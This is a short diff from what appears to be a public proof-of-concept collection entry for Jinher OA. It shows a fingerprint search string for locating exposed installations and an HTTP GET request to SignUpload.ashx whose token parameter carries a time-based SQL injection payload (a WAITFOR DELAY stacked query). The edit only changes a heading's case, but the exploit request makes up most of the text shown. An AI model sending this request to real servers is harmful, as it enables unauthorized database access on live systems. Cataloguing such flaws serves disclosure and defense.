@@ -8,7 +8,7 @@
 body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || app="Jinher-OA"
 ```
 
-## poc
+## POC
 
 ```java
 GET /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%201%27+--%20and%201=1_123_123&filename=1 HTTP/1.1
